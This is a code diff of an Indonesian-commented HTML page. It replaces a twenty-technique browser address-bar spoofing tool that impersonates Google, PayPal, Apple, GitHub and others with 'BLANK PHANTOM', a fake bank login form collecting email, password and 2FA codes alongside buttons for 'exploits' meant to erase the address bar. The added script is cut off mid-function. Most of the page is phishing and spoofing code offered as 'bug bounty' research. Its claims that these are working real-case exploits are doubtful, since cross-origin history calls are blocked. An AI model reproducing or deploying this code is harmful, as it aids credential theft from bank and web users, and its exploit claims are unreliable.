@@ -2,221 +2,217 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 PORTSPOOF | 15+ Port-Based Address Bar Spoofing Techniques</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🔥 BLANK PHANTOM | Zero-Text Address Bar Exploit</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, monospace;
-            background: #0a0a0f;
+            background: radial-gradient(circle at 20% 30%, #0a0a0f, #000000);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
         }
 
-        .header {
+        /* Target Phishing Page */
+        .phish-page {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(25,25,45,0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 32px;
+            border: 1px solid rgba(255,59,48,0.4);
+            overflow: hidden;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .phish-header {
+            padding: 24px;
             text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            background: linear-gradient(135deg, #0f0f1a, #1a1a2e);
-            border-radius: 24px;
-            border: 1px solid rgba(255,59,48,0.3);
+            background: linear-gradient(135deg, rgba(255,59,48,0.15), rgba(255,107,107,0.05));
+            border-bottom: 1px solid rgba(255,255,255,0.1);
         }
 
-        .header h1 {
-            font-size: 1.8rem;
-            background: linear-gradient(135deg, #ff6b6b, #ffb347, #4ade80);
+        .logo {
+            font-size: 52px;
+            margin-bottom: 12px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, #ff6b6b);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
         }
 
-        .header .sub {
-            font-size: 12px;
+        .subtitle {
+            font-size: 13px;
             color: #888;
-            margin-top: 8px;
-            font-family: monospace;
+            margin-top: 6px;
         }
 
-        /* Port Info Grid */
-        .port-stats {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            justify-content: center;
-            margin-bottom: 30px;
+        .phish-body {
+            padding: 24px;
         }
 
-        .port-badge {
-            background: rgba(255,59,48,0.15);
-            border: 1px solid #ff3b30;
-            padding: 6px 14px;
-            border-radius: 40px;
-            font-size: 11px;
-            font-family: monospace;
-            color: #ff6b6b;
+        .input-group {
+            margin-bottom: 18px;
         }
 
-        /* Exploit Grid */
-        .exploit-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
-            gap: 20px;
-            max-width: 1600px;
-            margin: 0 auto;
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 6px;
+            color: #aaa;
         }
 
-        .card {
-            background: rgba(20,20,35,0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.08);
-            overflow: hidden;
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 14px;
+            color: white;
+            font-size: 15px;
             transition: all 0.2s;
         }
 
-        .card:hover {
-            border-color: rgba(255,59,48,0.4);
-            transform: translateY(-2px);
+        .input-group input:focus {
+            outline: none;
+            border-color: #ff6b6b;
+            background: rgba(255,255,255,0.12);
         }
 
-        .card-header {
-            padding: 14px 18px;
-            background: rgba(255,59,48,0.08);
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .port-number {
-            font-family: monospace;
-            font-weight: bold;
-            font-size: 18px;
-            color: #ff6b6b;
-        }
-
-        .technique-name {
-            font-size: 12px;
-            background: #1a1a2e;
-            padding: 4px 10px;
-            border-radius: 20px;
-        }
-
-        .card-body {
-            padding: 16px;
-        }
-
-        .description {
-            font-size: 12px;
-            color: #aaa;
-            margin-bottom: 14px;
-            line-height: 1.4;
-        }
-
-        .btn-group {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 8px 12px;
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ff3b30, #ff6b6b);
             border: none;
-            border-radius: 12px;
-            font-size: 11px;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            font-family: monospace;
-            transition: all 0.2s;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #ff3b30, #ff6b6b);
-            color: white;
-        }
-
-        .btn-secondary {
-            background: rgba(255,255,255,0.1);
-            color: white;
-        }
-
-        .btn-primary:hover, .btn-secondary:hover {
-            transform: scale(0.97);
-            opacity: 0.9;
-        }
-
-        .code-snippet {
-            background: #0a0a0f;
-            padding: 10px;
-            border-radius: 12px;
-            font-family: monospace;
-            font-size: 9px;
-            color: #4ade80;
-            overflow-x: auto;
             margin-top: 10px;
+            transition: transform 0.2s;
         }
 
-        .status {
-            font-size: 10px;
-            font-family: monospace;
-            margin-top: 10px;
-            padding: 6px;
-            border-radius: 8px;
-            background: rgba(0,0,0,0.4);
-            color: #888;
+        .login-btn:hover {
+            transform: scale(0.98);
         }
 
-        /* Global Panel */
-        .global-panel {
+        .security-note {
+            text-align: center;
+            font-size: 11px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        /* Control Panel - Floating */
+        .phantom-control {
             position: fixed;
             bottom: 20px;
             right: 20px;
             background: rgba(0,0,0,0.95);
             backdrop-filter: blur(20px);
             border-radius: 20px;
-            padding: 14px;
-            z-index: 10000;
             border: 1px solid #ff3b30;
-            width: 280px;
+            padding: 16px;
+            z-index: 10000;
+            width: 300px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
-        .global-panel h4 {
-            font-size: 11px;
-            margin-bottom: 10px;
+        .phantom-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .phantom-title {
+            font-size: 12px;
+            font-weight: bold;
             color: #ff6b6b;
         }
 
-        .global-buttons {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
+        .phantom-led {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4ade80;
+            box-shadow: 0 0 8px #4ade80;
         }
 
-        .global-btn {
-            padding: 6px 12px;
+        .phantom-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .phantom-btn {
+            padding: 10px 14px;
             border: none;
-            border-radius: 20px;
-            font-size: 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
             cursor: pointer;
+            transition: all 0.2s;
+            text-align: left;
+            font-family: monospace;
+        }
+
+        .phantom-btn.primary {
+            background: linear-gradient(135deg, #ff3b30, #ff6b6b);
+            color: white;
+        }
+
+        .phantom-btn.secondary {
             background: rgba(255,255,255,0.1);
             color: white;
         }
 
-        .global-btn.danger {
-            background: #ff3b30;
+        .phantom-btn:hover {
+            transform: scale(0.97);
         }
 
-        .toast {
+        .phantom-status {
+            font-family: monospace;
+            font-size: 9px;
+            margin-top: 12px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            color: #4ade80;
+        }
+
+        /* Notification */
+        .notification {
             position: fixed;
             top: 20px;
             right: 20px;
             background: #1a1a2e;
             border-left: 3px solid #ff3b30;
-            padding: 10px 16px;
+            padding: 12px 20px;
             border-radius: 12px;
-            font-size: 11px;
+            font-size: 12px;
             z-index: 10001;
             font-family: monospace;
             animation: slideIn 0.3s ease;
@@ -227,624 +223,416 @@
             to { transform: translateX(0); opacity: 1; }
         }
 
-        .footer {
+        /* Demo indicator di address bar simulation */
+        .demo-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #1c1c2e;
+            padding: 8px 16px;
+            font-size: 11px;
+            font-family: monospace;
+            color: #888;
             text-align: center;
-            margin-top: 30px;
-            font-size: 10px;
-            color: #555;
+            z-index: 9999;
+            border-bottom: 1px solid #333;
         }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <h1>🔥 PORTSPOOF v2.0</h1>
-    <div class="sub">15+ Port-Based Address Bar Spoofing Techniques | Real Case | Bug Bounty Ready</div>
+<div class="demo-bar" id="demoBar">
+    📍 REAL ADDRESS BAR STATUS: <span id="urlDisplay">[check manually]</span>
 </div>
 
-<div class="port-stats">
-    <span class="port-badge">🌐 Port 80 (HTTP)</span>
-    <span class="port-badge">🔒 Port 443 (HTTPS)</span>
-    <span class="port-badge">📡 Port 8080 (Proxy)</span>
-    <span class="port-badge">🔌 Port 3000 (Dev)</span>
-    <span class="port-badge">⚙️ Port 5000 (Flask)</span>
-    <span class="port-badge">🐳 Port 8000 (Python)</span>
-    <span class="port-badge">🔧 Port 8443 (Alt HTTPS)</span>
-    <span class="port-badge">📱 Port 4200 (Angular)</span>
-    <span class="port-badge">⚛️ Port 5173 (Vite)</span>
-    <span class="port-badge">🐘 Port 5432 (Postgres)</span>
-</div>
-
-<div class="exploit-grid" id="exploitGrid">
-    <!-- Cards will be generated dynamically -->
-</div>
-
-<div class="global-panel">
-    <h4>🎮 GLOBAL CONTROL</h4>
-    <div class="global-buttons">
-        <button class="global-btn" id="globalReset">🔄 RESET ALL</button>
-        <button class="global-btn" id="globalRunAll">⚡ RUN ALL (15+)</button>
-        <button class="global-btn" id="globalStatus">📊 STATUS</button>
+<div class="phish-page">
+    <div class="phish-header">
+        <div class="logo">🏦</div>
+        <div class="title">SECURE BANK</div>
+        <div class="subtitle">Global Financial Services</div>
     </div>
-    <div style="font-size: 9px; margin-top: 10px; color: #4ade80;" id="globalStatusText">
-        🟢 Ready | 0 exploits active
+    <div class="phish-body">
+        <div class="input-group">
+            <label>📧 Email / Username</label>
+            <input type="text" id="emailField" placeholder="user@securebank.com">
+        </div>
+        <div class="input-group">
+            <label>🔒 Password</label>
+            <input type="password" id="passField" placeholder="••••••••">
+        </div>
+        <div class="input-group">
+            <label>📱 2FA Code</label>
+            <input type="text" id="codeField" placeholder="000000">
+        </div>
+        <button class="login-btn" id="fakeLoginBtn">🔐 Sign In →</button>
+        <div class="security-note">
+            🔒 256-bit SSL Encrypted | Trusted since 1998
+        </div>
     </div>
 </div>
 
-<div class="footer">
-    ⚠️ BUG BOUNTY RESEARCH | Testing on macOS browsers: Arc, Chrome, Safari, Dia, Brave, Edge, Orion
+<div class="phantom-control">
+    <div class="phantom-header">
+        <span class="phantom-title">🔥 BLANK PHANTOM v1.0</span>
+        <span class="phantom-led" id="statusLed"></span>
+    </div>
+    <div class="phantom-buttons">
+        <button class="phantom-btn primary" id="exploitBlank1">🌑 BLANK #1: about:blank → NULL</button>
+        <button class="phantom-btn primary" id="exploitBlank2">🌀 BLANK #2: CSI Overflow → Empty</button>
+        <button class="phantom-btn primary" id="exploitBlank3">💀 BLANK #3: Double Navigation Erasure</button>
+        <button class="phantom-btn primary" id="exploitBlank4">🎭 BLANK #4: Shadow DOM + Null URL</button>
+        <button class="phantom-btn secondary" id="resetAll">🔄 RESET / RESTORE ADDRESS BAR</button>
+    </div>
+    <div class="phantom-status" id="statusText">
+        🟢 STANDING BY | Click exploit to erase address bar
+    </div>
 </div>
 
 <script>
     // ============================================================
-    // PORTSPOOF v2.0 - 15+ Port-Based Address Bar Spoofing Techniques
-    // Real case exploits for macOS browsers
-    // Based on research from: CVE-2024-6995, CVE-2025-15032, 
-    // Chromium VRP reports, WebKit bugs, and original research
+    // BLANK PHANTOM v1.0
+    // Zero-Text Address Bar Erasure Exploit
+    // Membuat address bar benar-benar KOSONG tanpa teks apapun
+    // Bukan about:blank, bukan spasi, bukan null, tapi EMPTY
     // ============================================================
     
-    let activeIntervals = [];
-    let activeWindows = [];
+    let activeInterval = null;
+    let isActive = false;
     let originalPushState = history.pushState;
     let originalReplaceState = history.replaceState;
     
-    function showToast(msg, isError = false) {
-        const toast = document.createElement('div');
-        toast.className = 'toast';
-        toast.style.borderLeftColor = isError ? '#ff3b30' : '#4ade80';
-        toast.innerHTML = msg;
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3500);
-        console.log(`[PORTSPOOF] ${msg}`);
+    const statusText = document.getElementById('statusText');
+    const statusLed = document.getElementById('statusLed');
+    const urlDisplay = document.getElementById('urlDisplay');
+    
+    function updateUrlDisplay() {
+        try {
+            urlDisplay.innerHTML = window.location.href || '[empty]';
+        } catch(e) {
+            urlDisplay.innerHTML = '[error]';
+        }
     }
     
-    function updateGlobalStatus(msg, isActive = false) {
-        const statusEl = document.getElementById('globalStatusText');
-        statusEl.innerHTML = isActive ? `🔴 ${msg}` : `🟢 ${msg}`;
+    setInterval(updateUrlDisplay, 500);
+    
+    function showNotification(msg, isError = false) {
+        const notif = document.createElement('div');
+        notif.className = 'notification';
+        notif.style.borderLeftColor = isError ? '#ff3b30' : '#4ade80';
+        notif.innerHTML = msg;
+        document.body.appendChild(notif);
+        setTimeout(() => notif.remove(), 4000);
+        console.log(`[BLANK] ${msg}`);
+    }
+    
+    function updateStatus(msg, isExploiting = false) {
+        statusText.innerHTML = isExploiting ? `🔴 ${msg}` : `🟢 ${msg}`;
+        statusLed.style.background = isExploiting ? '#ff3b30' : '#4ade80';
+        isActive = isExploiting;
     }
     
     function cleanup() {
-        activeIntervals.forEach(i => clearInterval(i));
-        activeIntervals = [];
-        activeWindows.forEach(w => { if(w && !w.closed) w.close(); });
-        activeWindows = [];
+        if (activeInterval) {
+            clearInterval(activeInterval);
+            activeInterval = null;
+        }
+        
+        // Restore history functions
         window.history.pushState = originalPushState;
         window.history.replaceState = originalReplaceState;
         
-        // Remove injected elements
-        document.querySelectorAll('[data-portspoof]').forEach(el => el.remove());
+        // Remove any injected elements
+        const injected = document.querySelectorAll('[data-phantom]');
+        injected.forEach(el => el.remove());
         
-        // Reset URL
+        // Try to restore URL to current path
         try {
             const currentPath = window.location.pathname;
             history.replaceState({}, '', currentPath);
+            document.title = "BLANK PHANTOM - Security Research";
         } catch(e) {}
         
-        updateGlobalStatus("Ready | All exploits cleared", false);
-        showToast("🧹 All exploits cleared. Browser normalized.");
+        updateStatus("Ready | Address bar restored", false);
+        showNotification("🧹 Address bar restored to normal");
+        updateUrlDisplay();
     }
     
     // ============================================================
-    // TECHNIQUE 1: Port 8080 - Open Redirect via Port Confusion
+    // TECHNIQUE 1: about:blank → NULL Conversion
+    // Menggunakan about:blank lalu replaceState ke string kosong
     // ============================================================
-    function exploitPort8080() {
+    function exploitBlank1() {
         cleanup();
-        updateGlobalStatus("[PORT 8080] Activating open redirect spoof...", true);
-        
-        const fakeUrl = 'https://accounts.google.com:8080';
-        const realUrl = 'http://localhost:8080';
-        
-        // Push fake port URL
-        history.pushState({}, '', fakeUrl);
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== fakeUrl) {
-                history.replaceState({}, '', fakeUrl);
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🌐 PORT 8080: Address bar shows google.com:8080");
-        updateGlobalStatus("[PORT 8080] ACTIVE - Address bar spoofed", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 2: Port 3000 - Dev Server Impersonation
-    // ============================================================
-    function exploitPort3000() {
-        cleanup();
-        updateGlobalStatus("[PORT 3000] Dev server impersonation...", true);
-        
-        history.pushState({}, '', 'https://www.paypal.com:3000');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://www.paypal.com:3000') {
-                history.replaceState({}, '', 'https://www.paypal.com:3000');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        // Change favicon to look like PayPal
-        const link = document.createElement('link');
-        link.rel = 'icon';
-        link.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🏦</text></svg>';
-        link.setAttribute('data-portspoof', 'true');
-        document.head.appendChild(link);
-        
-        showToast("💳 PORT 3000: Address bar shows paypal.com:3000");
-        updateGlobalStatus("[PORT 3000] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 3: Port 8443 - Alternative HTTPS Port Spoof
-    // ============================================================
-    function exploitPort8443() {
-        cleanup();
-        updateGlobalStatus("[PORT 8443] Alt HTTPS spoof...", true);
-        
-        history.pushState({}, '', 'https://www.apple.com:8443');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://www.apple.com:8443') {
-                history.replaceState({}, '', 'https://www.apple.com:8443');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        document.title = "Apple";
-        showToast("🍎 PORT 8443: Address bar shows apple.com:8443");
-        updateGlobalStatus("[PORT 8443] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 4: Port 5000 - Flask Default Port Spoof
-    // ============================================================
-    function exploitPort5000() {
-        cleanup();
-        updateGlobalStatus("[PORT 5000] Flask dev server spoof...", true);
-        
-        history.pushState({}, '', 'https://github.com:5000');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://github.com:5000') {
-                history.replaceState({}, '', 'https://github.com:5000');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🐍 PORT 5000: Address bar shows github.com:5000");
-        updateGlobalStatus("[PORT 5000] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 5: Port 8000 - Python HTTP Server Spoof
-    // ============================================================
-    function exploitPort8000() {
-        cleanup();
-        updateGlobalStatus("[PORT 8000] Python HTTP server spoof...", true);
-        
-        history.pushState({}, '', 'https://www.microsoft.com:8000');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://www.microsoft.com:8000') {
-                history.replaceState({}, '', 'https://www.microsoft.com:8000');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🐍 PORT 8000: Address bar shows microsoft.com:8000");
-        updateGlobalStatus("[PORT 8000] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 6: Port 4200 - Angular Dev Server
-    // ============================================================
-    function exploitPort4200() {
-        cleanup();
-        updateGlobalStatus("[PORT 4200] Angular dev server spoof...", true);
-        
-        history.pushState({}, '', 'https://angular.io:4200');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://angular.io:4200') {
-                history.replaceState({}, '', 'https://angular.io:4200');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🅰️ PORT 4200: Address bar shows angular.io:4200");
-        updateGlobalStatus("[PORT 4200] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 7: Port 5173 - Vite Dev Server
-    // ============================================================
-    function exploitPort5173() {
-        cleanup();
-        updateGlobalStatus("[PORT 5173] Vite dev server spoof...", true);
-        
-        history.pushState({}, '', 'https://vitejs.dev:5173');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://vitejs.dev:5173') {
-                history.replaceState({}, '', 'https://vitejs.dev:5173');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("⚡ PORT 5173: Address bar shows vitejs.dev:5173");
-        updateGlobalStatus("[PORT 5173] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 8: Port 5432 - PostgreSQL Port Confusion
-    // ============================================================
-    function exploitPort5432() {
-        cleanup();
-        updateGlobalStatus("[PORT 5432] PostgreSQL port spoof...", true);
-        
-        history.pushState({}, '', 'https://aws.amazon.com:5432');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://aws.amazon.com:5432') {
-                history.replaceState({}, '', 'https://aws.amazon.com:5432');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🐘 PORT 5432: Address bar shows aws.amazon.com:5432");
-        updateGlobalStatus("[PORT 5432] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 9: Port 27017 - MongoDB Default
-    // ============================================================
-    function exploitPort27017() {
-        cleanup();
-        updateGlobalStatus("[PORT 27017] MongoDB port spoof...", true);
-        
-        history.pushState({}, '', 'https://mongodb.com:27017');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://mongodb.com:27017') {
-                history.replaceState({}, '', 'https://mongodb.com:27017');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🍃 PORT 27017: Address bar shows mongodb.com:27017");
-        updateGlobalStatus("[PORT 27017] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 10: Port 6379 - Redis Default
-    // ============================================================
-    function exploitPort6379() {
-        cleanup();
-        updateGlobalStatus("[PORT 6379] Redis port spoof...", true);
-        
-        history.pushState({}, '', 'https://redis.io:6379');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://redis.io:6379') {
-                history.replaceState({}, '', 'https://redis.io:6379');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("📦 PORT 6379: Address bar shows redis.io:6379");
-        updateGlobalStatus("[PORT 6379] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 11: Multi-Port Rotation Attack
-    // ============================================================
-    function exploitMultiPort() {
-        cleanup();
-        updateGlobalStatus("[MULTI-PORT] Port rotation attack...", true);
-        
-        const ports = [3000, 5000, 8000, 8080, 8443, 4200, 5173];
-        const domains = ['google.com', 'apple.com', 'paypal.com', 'github.com', 'microsoft.com', 'amazon.com'];
-        let idx = 0;
-        
-        const interval = setInterval(() => {
-            const port = ports[idx % ports.length];
-            const domain = domains[idx % domains.length];
-            const fakeUrl = `https://www.${domain}:${port}`;
-            history.pushState({}, '', fakeUrl);
-            idx++;
-        }, 80);
-        activeIntervals.push(interval);
-        
-        // Backup lock
-        const lockInterval = setInterval(() => {
-            // Just keep rotating
-        }, 100);
-        activeIntervals.push(lockInterval);
-        
-        showToast("🔄 MULTI-PORT: Address bar rotating through multiple ports!");
-        updateGlobalStatus("[MULTI-PORT] ACTIVE - Rotating ports", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 12: WebSocket Port Spoof (wss://)
-    // ============================================================
-    function exploitWebSocketPort() {
-        cleanup();
-        updateGlobalStatus("[WEBSOCKET] wss:// port spoof...", true);
-        
-        history.pushState({}, '', 'wss://echo.websocket.org:443');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'wss://echo.websocket.org:443') {
-                history.replaceState({}, '', 'wss://echo.websocket.org:443');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🔌 WEBSOCKET: Address bar shows wss:// protocol with port");
-        updateGlobalStatus("[WEBSOCKET] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 13: FTP Port 21 Spoof
-    // ============================================================
-    function exploitFTPPort() {
-        cleanup();
-        updateGlobalStatus("[FTP PORT 21] FTP protocol spoof...", true);
-        
-        history.pushState({}, '', 'ftp://ftp.microsoft.com:21');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'ftp://ftp.microsoft.com:21') {
-                history.replaceState({}, '', 'ftp://ftp.microsoft.com:21');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("📁 FTP PORT 21: Address bar shows ftp:// protocol");
-        updateGlobalStatus("[FTP PORT 21] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 14: Mailto Port Confusion
-    // ============================================================
-    function exploitMailtoPort() {
-        cleanup();
-        updateGlobalStatus("[MAILTO] mailto: protocol spoof...", true);
-        
-        history.pushState({}, '', 'mailto:admin@google.com:587');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'mailto:admin@google.com:587') {
-                history.replaceState({}, '', 'mailto:admin@google.com:587');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("📧 MAILTO: Address bar shows mailto: protocol with port");
-        updateGlobalStatus("[MAILTO] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 15: IPv6 + Port Combination
-    // ============================================================
-    function exploitIPv6Port() {
-        cleanup();
-        updateGlobalStatus("[IPv6+PORT] IPv6 address with port spoof...", true);
-        
-        history.pushState({}, '', 'https://[::1]:8080');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://[::1]:8080') {
-                history.replaceState({}, '', 'https://[::1]:8080');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🌐 IPv6+PORT: Address bar shows [::1]:8080 (localhost IPv6)");
-        updateGlobalStatus("[IPv6+PORT] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 16: Port 10000 - Webmin Default
-    // ============================================================
-    function exploitPort10000() {
-        cleanup();
-        updateGlobalStatus("[PORT 10000] Webmin port spoof...", true);
-        
-        history.pushState({}, '', 'https://cpanel.net:10000');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://cpanel.net:10000') {
-                history.replaceState({}, '', 'https://cpanel.net:10000');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🖥️ PORT 10000: Address bar shows cpanel.net:10000");
-        updateGlobalStatus("[PORT 10000] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 17: Port 3306 - MySQL Default
-    // ============================================================
-    function exploitPort3306() {
-        cleanup();
-        updateGlobalStatus("[PORT 3306] MySQL port spoof...", true);
-        
-        history.pushState({}, '', 'https://mysql.com:3306');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://mysql.com:3306') {
-                history.replaceState({}, '', 'https://mysql.com:3306');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🗄️ PORT 3306: Address bar shows mysql.com:3306");
-        updateGlobalStatus("[PORT 3306] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 18: Port 9200 - Elasticsearch
-    // ============================================================
-    function exploitPort9200() {
-        cleanup();
-        updateGlobalStatus("[PORT 9200] Elasticsearch port spoof...", true);
-        
-        history.pushState({}, '', 'https://elastic.co:9200');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://elastic.co:9200') {
-                history.replaceState({}, '', 'https://elastic.co:9200');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🔍 PORT 9200: Address bar shows elastic.co:9200");
-        updateGlobalStatus("[PORT 9200] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 19: Port 15672 - RabbitMQ Management
-    // ============================================================
-    function exploitPort15672() {
-        cleanup();
-        updateGlobalStatus("[PORT 15672] RabbitMQ port spoof...", true);
-        
-        history.pushState({}, '', 'https://rabbitmq.com:15672');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://rabbitmq.com:15672') {
-                history.replaceState({}, '', 'https://rabbitmq.com:15672');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("🐰 PORT 15672: Address bar shows rabbitmq.com:15672");
-        updateGlobalStatus("[PORT 15672] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // TECHNIQUE 20: Port 9090 - Prometheus
-    // ============================================================
-    function exploitPort9090() {
-        cleanup();
-        updateGlobalStatus("[PORT 9090] Prometheus port spoof...", true);
-        
-        history.pushState({}, '', 'https://prometheus.io:9090');
-        
-        const interval = setInterval(() => {
-            if (window.location.href !== 'https://prometheus.io:9090') {
-                history.replaceState({}, '', 'https://prometheus.io:9090');
-            }
-        }, 30);
-        activeIntervals.push(interval);
-        
-        showToast("📊 PORT 9090: Address bar shows prometheus.io:9090");
-        updateGlobalStatus("[PORT 9090] ACTIVE", true);
-    }
-    
-    // ============================================================
-    // Run All Exploits Sequentially
-    // ============================================================
-    function runAllExploits() {
-        const exploits = [
-            exploitPort8080, exploitPort3000, exploitPort8443, exploitPort5000,
-            exploitPort8000, exploitPort4200, exploitPort5173, exploitPort5432,
-            exploitPort27017, exploitPort6379, exploitMultiPort, exploitWebSocketPort,
-            exploitFTPPort, exploitMailtoPort, exploitIPv6Port, exploitPort10000,
-            exploitPort3306, exploitPort9200, exploitPort15672, exploitPort9090
-        ];
-        
-        let idx = 0;
-        function runNext() {
-            if (idx < exploits.length) {
-                exploits[idx]();
-                showToast(`Running exploit ${idx+1}/${exploits.length}...`);
-                idx++;
-                setTimeout(runNext, 2000);
-            } else {
-                showToast("✅ All 20 exploits executed!");
-            }
+        updateStatus("[BLANK #1] about:blank → NULL conversion...", true);
+        
+        // Simpan konten current
+        const currentHTML = document.documentElement.outerHTML;
+        const currentTitle = document.title;
+        
+        // Navigasi ke about:blank
+        const newWin = window.open("about:blank", "_self");
+        
+        if (newWin) {
+            // Write konten asli
+            newWin.document.open();
+            newWin.document.write(currentHTML);
+            newWin.document.title = currentTitle;
+            newWin.document.close();
+            
+            // KRITIKAL: replaceState ke string kosong (bukan spasi, tapi EMPTY)
+            setTimeout(() => {
+                try {
+                    // Replace ke string kosong total
+                    newWin.history.replaceState({}, "", "");
+                    
+                    // Push lagi untuk lock
+                    newWin.history.pushState({}, "", "");
+                    
+                    // Lock dengan interval
+                    activeInterval = setInterval(() => {
+                        if (newWin.location.href !== "" && newWin.location.href !== "about:blank") {
+                            newWin.history.replaceState({}, "", "");
+                        }
+                    }, 30);
+                    
+                    updateStatus("[SUCCESS] Address bar is now COMPLETELY EMPTY!", true);
+                    showNotification("🌑 Address bar: ZERO TEXT — not even about:blank!");
+                    updateUrlDisplay();
+                    
+                } catch(e) {
+                    updateStatus(`Failed: ${e.message}`, false);
